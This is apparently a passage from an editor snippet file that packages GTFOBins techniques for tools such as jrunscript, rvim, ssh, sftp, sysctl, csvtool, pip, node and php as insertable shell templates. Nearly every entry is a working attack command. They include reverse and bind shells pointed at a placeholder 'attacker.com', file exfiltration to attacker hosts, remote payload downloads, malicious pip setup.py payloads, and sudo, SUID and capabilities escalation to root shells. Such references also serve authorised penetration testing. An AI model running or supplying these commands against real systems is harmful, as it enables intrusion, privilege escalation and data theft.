        "prefix": "jrunscript reverse-shell",
        "body": [
            "abuse jrunscript with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "jrunscript -e 'var host='\"'\"\"\\$RHOST\"\"'\"'; var port='\"\\$RPORT\"';",
            "var p=new java.lang.ProcessBuilder(\"/bin/bash\", \"-i\").redirectErrorStream(true).start();",
            "var s=new java.net.Socket(host,port);",
            "var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();",
            "var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){",
            "while(pi.available()>0)so.write(pi.read());",
            "while(pe.available()>0)so.write(pe.read());",
            "while(si.available()>0)po.write(si.read());",
            "so.flush();po.flush();",
            "java.lang.Thread.sleep(50);",
            "try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'${0}",
            "```"
        ],
        "description": "abuse jrunscript with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "jrunscript file-download (gtfobins)": {
        "prefix": "jrunscript file-download",
        "body": [
            "abuse jrunscript with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/file_to_get",
            "LFILE=${1:file_to_save}",
            "jrunscript -e \"cp('\\$URL','\\$LFILE')\"${0}",
            "```"
        ],
        "description": "abuse jrunscript with file-download - Fetch a remote file via HTTP GET request."
    },
    "jrunscript file-write (gtfobins)": {
        "prefix": "jrunscript file-write",
        "body": [
            "abuse jrunscript with file-write",
            "",
            "```sh",
            "jrunscript -e 'var fw=new java.io.FileWriter(\"./${1:file_to_write}\"); fw.write(\"DATA\"); fw.close();'${0}",
            "```"
        ],
        "description": "abuse jrunscript with file-write"
    },
    "jrunscript file-read (gtfobins)": {
        "prefix": "jrunscript file-read",
        "body": [
            "abuse jrunscript with file-read",
            "",
            "```sh",
            "jrunscript -e 'br = new BufferedReader(new java.io.FileReader(\"${1:file_to_read}\"));",
            "while ((line = br.readLine()) != null) { print(line); }'${0}",
            "```"
        ],
        "description": "abuse jrunscript with file-read"
    },
    "jrunscript suid (gtfobins)": {
        "prefix": "jrunscript suid",
        "body": [
            "abuse jrunscript with suid, This has been found working in macOS but failing on Linux systems.",
            "",
            "```sh",
            "./jrunscript -e \"exec('/bin/sh -pc \\\\$@|sh\\${IFS}-p _ echo sh -p <\\$(tty) >\\$(tty) 2>\\$(tty)')\"${0}",
            "```"
        ],
        "description": "abuse jrunscript with suid - This has been found working in macOS but failing on Linux systems."
    },
    "jrunscript sudo (gtfobins)": {
        "prefix": "jrunscript sudo",
        "body": [
            "abuse jrunscript with sudo",
            "",
            "```sh",
            "sudo jrunscript -e \"exec('/bin/sh -c \\\\$@|sh _ echo sh <\\$(tty) >\\$(tty) 2>\\$(tty)')\"${0}",
            "```"
        ],
        "description": "abuse jrunscript with sudo"
    },
    "run-parts shell (gtfobins)": {
        "prefix": "run-parts shell",
        "body": [
            "abuse run-parts with shell",
            "",
            "```sh",
            "run-parts --new-session --regex '^sh\\$' /bin${0}",
            "```"
        ],
        "description": "abuse run-parts with shell"
    },
    "run-parts sudo (gtfobins)": {
        "prefix": "run-parts sudo",
        "body": [
            "abuse run-parts with sudo",
            "",
            "```sh",
            "sudo run-parts --new-session --regex '^sh\\$' /bin${0}",
            "```"
        ],
        "description": "abuse run-parts with sudo"
    },
    "run-parts suid (gtfobins)": {
        "prefix": "run-parts suid",
        "body": [
            "abuse run-parts with suid",
            "",
            "```sh",
            "./run-parts --new-session --regex '^sh\\$' /bin --arg='-p'${0}",
            "```"
        ],
        "description": "abuse run-parts with suid"
    },
    "rvim shell (gtfobins)": {
        "prefix": "rvim shell",
        "body": [
            "abuse rvim with shell, This requires that `rvim` is compiled with Lua support.",
            "",
            "```sh",
            "rvim -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse rvim with shell - This requires that `rvim` is compiled with Lua support."
    },
    "rvim reverse-shell (gtfobins)": {
        "prefix": "rvim reverse-shell",
        "body": [
            "abuse rvim with reverse-shell, This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "rvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")",
            "vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse rvim with reverse-shell - This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "rvim non-interactive-reverse-shell (gtfobins)": {
        "prefix": "rvim non-interactive-reverse-shell",
        "body": [
            "abuse rvim with non-interactive-reverse-shell, Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "rvim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  while true do",
            "    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));t:send(b);",
            "  end;",
            "  f:close();t:close();'${0}",
            "```"
        ],
        "description": "abuse rvim with non-interactive-reverse-shell - Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed."
    },
    "rvim non-interactive-bind-shell (gtfobins)": {
        "prefix": "rvim non-interactive-bind-shell",
        "body": [
            "abuse rvim with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${1:12345}",
            "rvim -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  while true do",
            "    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));c:send(b);",
            "  end;c:close();f:close();'${0}",
            "```"
        ],
        "description": "abuse rvim with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed."
    },
    "rvim file-upload (gtfobins)": {
        "prefix": "rvim file-upload",
        "body": [
            "abuse rvim with file-upload, Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export RHOST=${2:attacker.com}",
            "export RPORT=${3:12345}",
            "export LFILE=${1:file_to_send}",
            "rvim -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')",
            "  local d=f:read(\"*a\")",
            "  io.close(f);",
            "  local s=require(\"socket\");",
            "  local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  t:send(d);",
            "  t:close();'${0}",
            "```"
        ],
        "description": "abuse rvim with file-upload - Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed."
    },
    "rvim file-download (gtfobins)": {
        "prefix": "rvim file-download",
        "body": [
            "abuse rvim with file-download, Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.",
            "",
            "```sh",
            "export LPORT=${2:12345}",
            "export LFILE=${1:file_to_save}",
            "rvim -c ':lua local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  local d,x=c:receive(\"*a\");",
            "  c:close();",
            "  local f=io.open(os.getenv(\"LFILE\"), \"wb\");",
            "  f:write(d);",
            "  io.close(f);'${0}",
            "```"
        ],
        "description": "abuse rvim with file-download - Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed."
    },
    "rvim file-write (gtfobins)": {
        "prefix": "rvim file-write",
        "body": [
            "abuse rvim with file-write",
            "",
            "```sh",
            "rvim ${1:file_to_write}",
            "iDATA",
            "^[",
            "w${0}",
            "```"
        ],
        "description": "abuse rvim with file-write"
    },
    "rvim file-read (gtfobins)": {
        "prefix": "rvim file-read",
        "body": [
            "abuse rvim with file-read",
            "",
            "```sh",
            "rvim ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse rvim with file-read"
    },
    "rvim library-load (gtfobins)": {
        "prefix": "rvim library-load",
        "body": [
            "abuse rvim with library-load, This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'${0}",
            "```"
        ],
        "description": "abuse rvim with library-load - This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "rvim suid (gtfobins)": {
        "prefix": "rvim suid",
        "body": [
            "abuse rvim with suid, This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'${0}",
            "```"
        ],
        "description": "abuse rvim with suid - This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "rvim sudo (gtfobins)": {
        "prefix": "rvim sudo",
        "body": [
            "abuse rvim with sudo, This requires that `rvim` is compiled with Lua support.",
            "",
            "```sh",
            "sudo rvim -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse rvim with sudo - This requires that `rvim` is compiled with Lua support."
    },
    "rvim capabilities (gtfobins)": {
        "prefix": "rvim capabilities",
        "body": [
            "abuse rvim with capabilities, This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.",
            "",
            "```sh",
            "./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse rvim with capabilities - This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3."
    },
    "rvim limited-suid (gtfobins)": {
        "prefix": "rvim limited-suid",
        "body": [
            "abuse rvim with limited-suid, This requires that `rvim` is compiled with Lua support.",
            "",
            "```sh",
            "./rvim -c ':lua os.execute(\"reset; exec sh\")'${0}",
            "```"
        ],
        "description": "abuse rvim with limited-suid - This requires that `rvim` is compiled with Lua support."
    },
    "ascii85 file-read (gtfobins)": {
        "prefix": "ascii85 file-read",
        "body": [
            "abuse ascii85 with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ascii85 \"\\$LFILE\" | ascii85 --decode${0}",
            "```"
        ],
        "description": "abuse ascii85 with file-read"
    },
    "ascii85 sudo (gtfobins)": {
        "prefix": "ascii85 sudo",
        "body": [
            "abuse ascii85 with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo ascii85 \"\\$LFILE\" | ascii85 --decode${0}",
            "```"
        ],
        "description": "abuse ascii85 with sudo"
    },
    "uudecode file-read (gtfobins)": {
        "prefix": "uudecode file-read",
        "body": [
            "abuse uudecode with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "uuencode \"\\$LFILE\" /dev/stdout | uudecode${0}",
            "```"
        ],
        "description": "abuse uudecode with file-read"
    },
    "uudecode suid (gtfobins)": {
        "prefix": "uudecode suid",
        "body": [
            "abuse uudecode with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "uuencode \"\\$LFILE\" /dev/stdout | uudecode${0}",
            "```"
        ],
        "description": "abuse uudecode with suid"
    },
    "uudecode sudo (gtfobins)": {
        "prefix": "uudecode sudo",
        "body": [
            "abuse uudecode with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo uuencode \"\\$LFILE\" /dev/stdout | uudecode${0}",
            "```"
        ],
        "description": "abuse uudecode with sudo"
    },
    "ssh shell (gtfobins)": {
        "prefix": "ssh shell",
        "body": [
            "abuse ssh with shell, Spawn interactive shell on client, requires a successful connection towards `host`.",
            "",
            "```sh",
            "ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh host${0}",
            "```"
        ],
        "description": "abuse ssh with shell - Spawn interactive shell on client, requires a successful connection towards `host`."
    },
    "ssh file-upload (gtfobins)": {
        "prefix": "ssh file-upload",
        "body": [
            "abuse ssh with file-upload, Send local file to a SSH server.",
            "",
            "```sh",
            "HOST=user@${3:attacker.com}",
            "RPATH=${2:file_to_save}",
            "LPATH=${1:file_to_send}",
            "ssh \\$HOST \"cat > \\$RPATH\" < \\$LPATH${0}",
            "```"
        ],
        "description": "abuse ssh with file-upload - Send local file to a SSH server."
    },
    "ssh file-download (gtfobins)": {
        "prefix": "ssh file-download",
        "body": [
            "abuse ssh with file-download, Fetch a remote file from a SSH server.",
            "",
            "```sh",
            "HOST=user@${2:attacker.com}",
            "RPATH=file_to_get",
            "LPATH=${1:file_to_save}",
            "ssh \\$HOST \"cat \\$RPATH\" > \\$LPATH${0}",
            "```"
        ],
        "description": "abuse ssh with file-download - Fetch a remote file from a SSH server."
    },
    "ssh file-read (gtfobins)": {
        "prefix": "ssh file-read",
        "body": [
            "abuse ssh with file-read, The read file content is corrupted by error prints.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ssh -F \\$LFILE localhost${0}",
            "```"
        ],
        "description": "abuse ssh with file-read - The read file content is corrupted by error prints."
    },
    "ssh sudo (gtfobins)": {
        "prefix": "ssh sudo",
        "body": [
            "abuse ssh with sudo, Spawn interactive root shell through ProxyCommand option.",
            "",
            "```sh",
            "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x${0}",
            "```"
        ],
        "description": "abuse ssh with sudo - Spawn interactive root shell through ProxyCommand option."
    },
    "sftp shell (gtfobins)": {
        "prefix": "sftp shell",
        "body": [
            "abuse sftp with shell",
            "",
            "```sh",
            "HOST=user@${1:attacker.com}",
            "sftp \\$HOST",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse sftp with shell"
    },
    "sftp file-upload (gtfobins)": {
        "prefix": "sftp file-upload",
        "body": [
            "abuse sftp with file-upload, Send local file to a SSH server.",
            "",
            "```sh",
            "RHOST=user@${3:attacker.com}",
            "sftp \\$RHOST",
            "put ${1:file_to_send} ${2:file_to_save}${0}",
            "```"
        ],
        "description": "abuse sftp with file-upload - Send local file to a SSH server."
    },
    "sftp file-download (gtfobins)": {
        "prefix": "sftp file-download",
        "body": [
            "abuse sftp with file-download, Fetch a remote file from a SSH server.",
            "",
            "```sh",
            "RHOST=user@${2:attacker.com}",
            "sftp \\$RHOST",
            "get file_to_get ${1:file_to_save}${0}",
            "```"
        ],
        "description": "abuse sftp with file-download - Fetch a remote file from a SSH server."
    },
    "sftp sudo (gtfobins)": {
        "prefix": "sftp sudo",
        "body": [
            "abuse sftp with sudo",
            "",
            "```sh",
            "HOST=user@${1:attacker.com}",
            "sudo sftp \\$HOST",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse sftp with sudo"
    },
    "sysctl command (gtfobins)": {
        "prefix": "sysctl command",
        "body": [
            "abuse sysctl with command, The command is executed by root in the background when a core dump occurs.",
            "",
            "```sh",
            "COMMAND='/bin/sh -c id>/tmp/id'",
            "sysctl \"kernel.core_pattern=|\\$COMMAND\"",
            "sleep 9999 &",
            "kill -QUIT \\$!",
            "cat /tmp/id${0}",
            "```"
        ],
        "description": "abuse sysctl with command - The command is executed by root in the background when a core dump occurs."
    },
    "sysctl file-read (gtfobins)": {
        "prefix": "sysctl file-read",
        "body": [
            "abuse sysctl with file-read, The `-p` argument can also be used in place of `-n`. In both cases though the output might get corrupted, so this might not be suitable to read binary files.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "/usr/sbin/sysctl -n \"/../../\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse sysctl with file-read - The `-p` argument can also be used in place of `-n`. In both cases though the output might get corrupted, so this might not be suitable to read binary files."
    },
    "sysctl suid (gtfobins)": {
        "prefix": "sysctl suid",
        "body": [
            "abuse sysctl with suid",
            "",
            "```sh",
            "COMMAND='/bin/sh -c id>/tmp/id'",
            "./sysctl \"kernel.core_pattern=|\\$COMMAND\"",
            "sleep 9999 &",
            "kill -QUIT \\$!",
            "cat /tmp/id${0}",
            "```"
        ],
        "description": "abuse sysctl with suid"
    },
    "sysctl sudo (gtfobins)": {
        "prefix": "sysctl sudo",
        "body": [
            "abuse sysctl with sudo",
            "",
            "```sh",
            "COMMAND='/bin/sh -c id>/tmp/id'",
            "sudo sysctl \"kernel.core_pattern=|\\$COMMAND\"",
            "sleep 9999 &",
            "kill -QUIT \\$!",
            "cat /tmp/id${0}",
            "```"
        ],
        "description": "abuse sysctl with sudo"
    },
    "csvtool file-read (gtfobins)": {
        "prefix": "csvtool file-read",
        "body": [
            "abuse csvtool with file-read, The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "csvtool trim t \\$LFILE${0}",
            "```"
        ],
        "description": "abuse csvtool with file-read - The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data."
    },
    "csvtool file-write (gtfobins)": {
        "prefix": "csvtool file-write",
        "body": [
            "abuse csvtool with file-write, The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo DATA > \\$TF",
            "csvtool trim t \\$TF -o \\$LFILE${0}",
            "```"
        ],
        "description": "abuse csvtool with file-write - The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data."
    },
    "csvtool suid (gtfobins)": {
        "prefix": "csvtool suid",
        "body": [
            "abuse csvtool with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./csvtool trim t \\$LFILE${0}",
            "```"
        ],
        "description": "abuse csvtool with suid"
    },
    "csvtool shell (gtfobins)": {
        "prefix": "csvtool shell",
        "body": [
            "abuse csvtool with shell",
            "",
            "```sh",
            "csvtool call '/bin/sh;false' /etc/passwd${0}",
            "```"
        ],
        "description": "abuse csvtool with shell"
    },
    "csvtool sudo (gtfobins)": {
        "prefix": "csvtool sudo",
        "body": [
            "abuse csvtool with sudo",
            "",
            "```sh",
            "sudo csvtool call '/bin/sh;false' /etc/passwd${0}",
            "```"
        ],
        "description": "abuse csvtool with sudo"
    },
    "pip shell (gtfobins)": {
        "prefix": "pip shell",
        "body": [
            "abuse pip with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <\\$(tty) >\\$(tty) 2>\\$(tty)')\" > \\$TF/setup.py",
            "pip install \\$TF${0}",
            "```"
        ],
        "description": "abuse pip with shell"
    },
    "pip reverse-shell (gtfobins)": {
        "prefix": "pip reverse-shell",
        "body": [
            "abuse pip with reverse-shell, Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "TF=\\$(mktemp -d)",
            "echo 'import sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")' > \\$TF/setup.py",
            "pip install \\$TF${0}",
            "```"
        ],
        "description": "abuse pip with reverse-shell - Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "pip file-upload (gtfobins)": {
        "prefix": "pip file-upload",
        "body": [
            "abuse pip with file-upload, Serve files in the local folder running an HTTP server.",
            "",
            "```sh",
            "export LPORT=8888",
            "TF=\\$(mktemp -d)",
            "echo 'import sys; from os import environ as e",
            "if sys.version_info.major == 3: import http.server as s, socketserver as ss",
            "else: import SimpleHTTPServer as s, SocketServer as ss",
            "ss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()' > \\$TF/setup.py",
            "pip install \\$TF${0}",
            "```"
        ],
        "description": "abuse pip with file-upload - Serve files in the local folder running an HTTP server."
    },
    "pip file-download (gtfobins)": {
        "prefix": "pip file-download",
        "body": [
            "abuse pip with file-download, Fetch a remote file via HTTP GET request. It needs an absolute local file path.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=/tmp/${1:file_to_save}",
            "TF=\\$(mktemp -d)",
            "echo 'import sys; from os import environ as e",
            "if sys.version_info.major == 3: import urllib.request as r",
            "else: import urllib as r",
            "r.urlretrieve(e[\"URL\"], e[\"LFILE\"])' > \\$TF/setup.py",
            "pip install \\$TF${0}",
            "```"
        ],
        "description": "abuse pip with file-download - Fetch a remote file via HTTP GET request. It needs an absolute local file path."
    },
    "pip file-write (gtfobins)": {
        "prefix": "pip file-write",
        "body": [
            "abuse pip with file-write, It needs an absolute local file path.",
            "",
            "```sh",
            "export LFILE=/tmp/${1:file_to_save}",
            "TF=\\$(mktemp -d)",
            "echo \"open('\\$LFILE','w+').write('DATA')\" > \\$TF/setup.py",
            "pip install \\$TF${0}",
            "```"
        ],
        "description": "abuse pip with file-write - It needs an absolute local file path."
    },
    "pip file-read (gtfobins)": {
        "prefix": "pip file-read",
        "body": [
            "abuse pip with file-read, The read file content is corrupted as wrapped within an exception error.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'raise Exception(open(\"${1:file_to_read}\").read())' > \\$TF/setup.py",
            "pip install \\$TF${0}",
            "```"
        ],
        "description": "abuse pip with file-read - The read file content is corrupted as wrapped within an exception error."
    },
    "pip library-load (gtfobins)": {
        "prefix": "pip library-load",
        "body": [
            "abuse pip with library-load",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")' > \\$TF/setup.py",
            "pip install \\$TF${0}",
            "```"
        ],
        "description": "abuse pip with library-load"
    },
    "pip sudo (gtfobins)": {
        "prefix": "pip sudo",
        "body": [
            "abuse pip with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <\\$(tty) >\\$(tty) 2>\\$(tty)')\" > \\$TF/setup.py",
            "sudo pip install \\$TF${0}",
            "```"
        ],
        "description": "abuse pip with sudo"
    },
    "node shell (gtfobins)": {
        "prefix": "node shell",
        "body": [
            "abuse node with shell",
            "",
            "```sh",
            "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'${0}",
            "```"
        ],
        "description": "abuse node with shell"
    },
    "node file-write (gtfobins)": {
        "prefix": "node file-write",
        "body": [
            "abuse node with file-write",
            "",
            "```sh",
            "node -e 'require(\"fs\").writeFileSync(\"${1:file_to_write}\", \"DATA\")'${0}",
            "```"
        ],
        "description": "abuse node with file-write"
    },
    "node file-read (gtfobins)": {
        "prefix": "node file-read",
        "body": [
            "abuse node with file-read",
            "",
            "```sh",
            "node -e 'process.stdout.write(require(\"fs\").readFileSync(\"/bin/ls\"))'${0}",
            "```"
        ],
        "description": "abuse node with file-read"
    },
    "node file-download (gtfobins)": {
        "prefix": "node file-download",
        "body": [
            "abuse node with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=${1:file_to_save}",
            "node -e 'require(\"http\").get(process.env.URL, res => res.pipe(require(\"fs\").createWriteStream(process.env.LFILE)))'${0}",
            "```"
        ],
        "description": "abuse node with file-download - Fetch a remote file via HTTP GET request."
    },
    "node file-upload (gtfobins)": {
        "prefix": "node file-upload",
        "body": [
            "abuse node with file-upload, Send a local file via HTTP POST request.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}",
            "export LFILE=${1:file_to_send}",
            "node -e 'require(\"fs\").createReadStream(process.env.LFILE).pipe(require(\"http\").request(process.env.URL))'${0}",
            "```"
        ],
        "description": "abuse node with file-upload - Send a local file via HTTP POST request."
    },
    "node reverse-shell (gtfobins)": {
        "prefix": "node reverse-shell",
        "body": [
            "abuse node with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");",
            "require(\"net\").connect(process.env.RPORT, process.env.RHOST, function () {",
            "  this.pipe(sh.stdin);",
            "  sh.stdout.pipe(this);",
            "  sh.stderr.pipe(this);",
            "})'${0}",
            "```"
        ],
        "description": "abuse node with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "node bind-shell (gtfobins)": {
        "prefix": "node bind-shell",
        "body": [
            "abuse node with bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell.",
            "",
            "```sh",
            "export LPORT=${1:12345}",
            "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");",
            "require(\"net\").createServer(function (client) {",
            "  client.pipe(sh.stdin);",
            "  sh.stdout.pipe(client);",
            "  sh.stderr.pipe(client);",
            "}).listen(process.env.LPORT)'${0}",
            "```"
        ],
        "description": "abuse node with bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell."
    },
    "node suid (gtfobins)": {
        "prefix": "node suid",
        "body": [
            "abuse node with suid",
            "",
            "```sh",
            "./node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'${0}",
            "```"
        ],
        "description": "abuse node with suid"
    },
    "node sudo (gtfobins)": {
        "prefix": "node sudo",
        "body": [
            "abuse node with sudo",
            "",
            "```sh",
            "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'${0}",
            "```"
        ],
        "description": "abuse node with sudo"
    },
    "node capabilities (gtfobins)": {
        "prefix": "node capabilities",
        "body": [
            "abuse node with capabilities",
            "",
            "```sh",
            "./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'${0}",
            "```"
        ],
        "description": "abuse node with capabilities"
    },
    "php shell (gtfobins)": {
        "prefix": "php shell",
        "body": [
            "abuse php with shell",
            "",
            "```sh",
            "export CMD=\"/bin/sh\"",
            "php -r '\\$h=@popen(getenv(\"CMD\"),\"r\"); if(\\$h){ while(!feof(\\$h)) echo(fread(\\$h,4096)); pclose(\\$h); }'${0}",
            "```"
        ],
        "description": "abuse php with shell"
    },
    "php command (gtfobins)": {
        "prefix": "php command",
        "body": [
            "abuse php with command",
            "",
            "```sh",
            "export CMD=\"id\"",
            "php -r '\\$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));\\$h = @proc_open(getenv(\"CMD\"), \\$p, \\$pipes);if(\\$h&&\\$pipes){while(!feof(\\$pipes[1])) echo(fread(\\$pipes[1],4096));while(!feof(\\$pipes[2])) echo(fread(\\$pipes[2],4096));fclose(\\$pipes[0]);fclose(\\$pipes[1]);fclose(\\$pipes[2]);proc_close(\\$h);}'${0}",
            "```"
        ],
        "description": "abuse php with command"
    },
    "php reverse-shell (gtfobins)": {
        "prefix": "php reverse-shell",
        "body": [
            "abuse php with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "php -r '\\$sock=fsockopen(getenv(\"RHOST\"),getenv(\"RPORT\"));exec(\"/bin/sh -i <&3 >&3 2>&3\");'${0}",
            "```"
        ],
        "description": "abuse php with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "php file-upload (gtfobins)": {
        "prefix": "php file-upload",
        "body": [
            "abuse php with file-upload, Serve files in the local folder running an HTTP server. This requires PHP version 5.4 or later.",
            "",
            "```sh",
            "LHOST=0.0.0.0",
            "LPORT=8888",
            "php -S \\$LHOST:\\$LPORT${0}",
            "```"
        ],
        "description": "abuse php with file-upload - Serve files in the local folder running an HTTP server. This requires PHP version 5.4 or later."
    },
    "php file-download (gtfobins)": {
        "prefix": "php file-download",
        "body": [
            "abuse php with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=${1:file_to_save}",
            "php -r '\\$c=file_get_contents(getenv(\"URL\"));file_put_contents(getenv(\"LFILE\"), \\$c);'${0}",
            "```"
        ],
        "description": "abuse php with file-download - Fetch a remote file via HTTP GET request."
    },
    "php suid (gtfobins)": {
        "prefix": "php suid",
        "body": [
            "abuse php with suid",
            "",
            "```sh",
            "CMD=\"/bin/sh\"",
            "./php -r \"pcntl_exec('/bin/sh', ['-p']);\"${0}",
            "```"
        ],
        "description": "abuse php with suid"
    },
    "php sudo (gtfobins)": {
        "prefix": "php sudo",
        "body": [
            "abuse php with sudo",
            "",
            "```sh",
            "CMD=\"/bin/sh\"",
            "sudo php -r \"system('\\$CMD');\"${0}",
            "```"
        ],
        "description": "abuse php with sudo"
    },
    "php capabilities (gtfobins)": {
        "prefix": "php capabilities",
        "body": [
            "abuse php with capabilities",
            "",
            "```sh",
            "CMD=\"/bin/sh\"",
